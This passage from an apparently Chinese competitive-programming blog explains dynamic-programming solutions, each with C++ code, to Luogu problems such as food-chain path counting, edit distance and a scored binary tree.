punctuation">;</span>            cin <span class="token operator">>></span> ux<span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>ux<span class="token punctuation">)</span>                mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> mp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">></span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> val<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    nxt<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> j<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> ans <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>ans <span class="token operator">&lt;</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            ans <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> pos <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>pos <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> pos <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        pos <span class="token operator">=</span> nxt<span class="token punctuation">[</span>pos<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span>         <span class="token operator">&lt;&lt;</span> ans<span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P4017-最大食物链计数"><a href="#P4017-最大食物链计数" class="headerlink" title="P4017 最大食物链计数"></a><a href="https://www.luogu.com.cn/problem/P4017">P4017 最大食物链计数</a></h4><ul><li><p>题意：<br>给一个图，求以入度为0的点为源点，出度为0的点为终点的路径的条数。</p></li><li><p>题解:<br>记忆化搜索搜一下。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> mp<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> dp<span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span><span class="token number">5005</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> mod <span class="token operator">=</span> <span class="token number">80112002</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>mp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>it <span class="token operator">:</span> mp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">%=</span> mod<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>       <span class="token keyword">return</span> dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span> <span class="token operator">%</span> mod<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    mp<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ux<span class="token punctuation">,</span> uy<span class="token punctuation">;</span>        cin <span class="token operator">>></span> ux <span class="token operator">>></span> uy<span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        mp<span class="token punctuation">[</span>uy<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>ux<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    dp<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> source<span class="token punctuation">;</span>    <span class="token keyword">int</span> u <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            source<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> res <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">auto</span> <span class="token operator">&amp;</span>it<span class="token operator">:</span>source<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        res <span class="token operator">+=</span> <span class="token function">dfs</span><span class="token punctuation">(</span>it<span class="token punctuation">)</span><span class="token punctuation">;</span>        res <span class="token operator">%=</span> mod<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> res <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h3 id="线性状态动态规划"><a href="#线性状态动态规划" class="headerlink" title="线性状态动态规划"></a><a href="https://www.luogu.com.cn/training/212#problems">线性状态动态规划</a></h3><h4 id="P1280-尼克的任务"><a href="#P1280-尼克的任务" class="headerlink" title="P1280 尼克的任务"></a><a href="https://www.luogu.com.cn/problem/P1280">P1280 尼克的任务</a></h4><ul><li><p>题意：<br>尼克的一个工作日为 n 分钟，从第 1 分钟开始到第 n 分钟结束。当尼克到达单位后他就开始干活，公司一共有 k 个任务需要完成。如果在同一时刻有多个任务需要完成，尼克可以任选其中的一个来做，而其余的则由他的同事完成，反之如果只有一个任务，则该任务必需由尼克去完成，假如某些任务开始时刻尼克正在工作，则这些任务也由尼克的同事完成。问尼克的最大空闲时间为多少。</p></li><li><p>题解:<br>规定$dp[i]$为从第$i$分钟开始，最大的空闲时间。那么就可以有转移方程</p></li></ul><script type="math/tex; mode=display">dp(i)=\left\{\begin{aligned}&dp[i+1]+1,当前时刻没有任务开始\\&max(dp[i],dp[i+task[i][j]]),当前时刻有任务开始，且任务的长度为task[i][j]\\\end{aligned}\right.</script><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> k<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> dp<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> task<span class="token punctuation">[</span><span class="token number">10001</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> k<span class="token punctuation">;</span>    dp<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> k<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> ux<span class="token punctuation">,</span> uy<span class="token punctuation">;</span>        cin <span class="token operator">>></span> ux <span class="token operator">>></span> uy<span class="token punctuation">;</span>        task<span class="token punctuation">[</span>ux<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>uy<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> pos <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n<span class="token punctuation">;</span> i <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>task<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> task<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>                dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> task<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">else</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2758-编辑距离"><a href="#P2758-编辑距离" class="headerlink" title="P2758 编辑距离"></a><a href="https://www.luogu.com.cn/problem/P2758">P2758 编辑距离</a></h4><ul><li><p>题意：<br>给定两个字符串，要用最少的字符操作次数，将字符串A转换为字符串B。有三种操作方式，分别是删除，插入和替换。</p></li><li><p>题解:<br>定义$dp[i][j]$表示将A字符串的$0 -  i$ 的字符串变换到和B字符串的$0 - j$相同的最少字符操作次数。</p></li></ul><script type="math/tex; mode=display">dp[i][j]=\left\{\begin{aligned}&dp[i-1][j-1],s[i-1]==t[j-1]\\&min(dp[i-1][j-1],dp[i][j-1]),dp[i-1][j])+1,s[i-1]\not ={t[j-1]}\\\end{aligned}\right.</script><pre class="language-cpp" data-language="cpp"><code class="language-cpp">string s<span class="token punctuation">,</span> t<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">2003</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">2003</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> s <span class="token operator">>></span> t<span class="token punctuation">;</span>    <span class="token keyword">int</span> ls <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> lt <span class="token operator">=</span> t<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    s <span class="token operator">+=</span> <span class="token string">" "</span><span class="token punctuation">,</span> t <span class="token operator">+=</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> ls<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> lt<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> ls<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> lt<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token punctuation">(</span>s<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> t<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">?</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> k<span class="token punctuation">,</span> <span class="token function">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span>ls<span class="token punctuation">]</span><span class="token punctuation">[</span>lt<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1040-加分二叉树"><a href="#P1040-加分二叉树" class="headerlink" title="P1040 加分二叉树"></a><a href="https://www.luogu.com.cn/problem/P1040">P1040 加分二叉树</a></h4><ul><li><p>题意：<br>设定一个节点数为n的二叉树，每个节点都有权值，并且二叉树的中序遍历为$1,2,3,…,n$，tree 及它的每个子树都有一个加分，任一棵子树 加分计算方法为: 左子树的加分 * 右子树的加分 + 本身的分数。若某个子树为空，规定其加分为 1，叶子的加分就是叶节点本身的分数。不考虑它的空子树。</p></li><li><p>题解:<br>在中序遍历这个序列上，某个点左边的序列一定是这个点的左子树，右边的序列，一定在这个点的右子树。<br>定义$dp[i][j]$表示从节点i到节点j的最大分数，枚举i到J的根节点K，动态更新即可。<br>转移方程：</p><p>  $dp[i][j] = max(dp[i][k-1]*dp[k+1][j]+value[k],dp[i][j])$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">>></span> <span class="token function">rt</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">long</span> <span class="token keyword">long</span><span class="token operator">></span> <span class="token function">value</span><span class="token punctuation">(</span><span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> st<span class="token punctuation">,</span><span class="token keyword">int</span> ed<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>st<span class="token operator">==</span>ed<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> st <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>rt<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>ed<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> rt<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>ed<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>st<span class="token punctuation">,</span> rt<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>ed<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>rt<span class="token punctuation">[</span>st<span class="token punctuation">]</span><span class="token punctuation">[</span>ed<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> ed<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> value<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> len <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> len<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">+</span> len <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> len<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> i<span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> j<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&lt;</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> dp<span class="token punctuation">[</span>k <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    rt<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P4933-大师"><a href="#P4933-大师" class="headerlink" title="P4933 大师"></a><a href="https://www.luogu.com.cn/problem/P4933">P4933 大师</a></h4><ul><li><p>题意：<br>给定一串序列，求子序列中为等差数列的个数。</p></li><li><p>题解:<br>动态规划，$dp[i][j]$ 表示到以第i个元素为结尾，公差为j的序列的个数。转移方程:</p><p>  $dp[i][value[i]-value[j]] += dp[j][value[i]-value[j]]+1$</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp">vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> <span class="token function">dp</span><span class="token punctuation">(</span><span class="token number">1005</span><span class="token punctuation">,</span> <span class="token generic-function"><span class="token function">vector</span><span class="token generic class-name"><span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token number">40005</span><span class="token 